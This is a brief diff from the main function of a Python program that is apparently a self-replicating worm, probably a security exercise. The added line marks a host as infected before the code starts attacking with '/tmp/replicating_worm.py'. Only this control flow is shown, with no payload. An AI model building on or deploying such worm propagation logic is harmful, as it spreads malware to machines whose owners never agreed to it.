@@ -159,6 +159,7 @@ def main(argv):
 			print("Don't understand argument!!\nTry again please")
 	else:
 		if isTargetInfected() == False:
+			markSystem()
 			startAttacking("/tmp/replicating_worm.py", False)
 	
 
